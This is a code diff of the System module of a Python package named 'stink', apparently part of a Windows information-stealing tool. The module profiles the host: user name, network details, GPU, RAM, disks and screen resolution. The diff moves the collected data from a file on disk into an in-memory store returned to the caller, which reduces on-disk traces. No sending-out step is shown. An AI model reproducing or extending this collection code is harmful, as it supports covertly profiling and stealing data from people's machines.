@@ -1,37 +1,25 @@
 import platform
+from os import path
 from json import loads
-from os import mkdir, path
+from typing import List
 from string import ascii_uppercase
 from urllib.request import urlopen
 from ctypes import windll, sizeof, byref, c_wchar_p
 from winreg import OpenKey, QueryValueEx, HKEY_LOCAL_MACHINE
 
-from stink.helpers import functions
 from stink.helpers.config import SystemConfig
-from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger
+from stink.helpers import DisplayDevice, MemoryStatusEx, UlargeInteger, functions, MemoryStorage
 
 
 class System:
     """
     Collects all system data.
     """
-    def __init__(self, storage_path: str, folder: str):
+    def __init__(self, folder: str):
 
-        self.__full_path = path.join(storage_path, folder)
+        self.__file = path.join(folder, "Configuration.txt")
         self.__config = SystemConfig()
-
-    def __create_folder(self) -> None:
-        """
-        Creates storage for the System module.
-
-        Parameters:
-        - None.
-
-        Returns:
-        - None.
-        """
-        if not path.exists(self.__full_path):
-            mkdir(self.__full_path)
+        self.__storage = MemoryStorage()
 
     @staticmethod
     def __get_video_card() -> str:
@@ -189,9 +177,9 @@ class System:
         disk_info = self.__get_disks_info()
         monitors_info = f"{user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
 
-        with open(path.join(self.__full_path, "Configuration.txt"), "a", encoding="utf-8") as system:
-
-            system.write(data.format(
+        self.__storage.add_from_memory(
+            self.__file,
+            data.format(
                 self.__config.User,
                 net_info,
                 machine_type,
@@ -202,11 +190,10 @@ class System:
                 gpu_info,
                 ram_info,
                 disk_info
-            ))
+            )
+        )
 
-        system.close()
-
-    def run(self) -> None:
+    def run(self) -> List:
         """
         Launches the system data collection module.
 
@@ -218,8 +205,9 @@ class System:
         """
         try:
 
-            self.__create_folder()
             self.__get_system_info()
+
+            return self.__storage.get_data()
 
         except Exception as e:
             print(f"[System]: {repr(e)}")
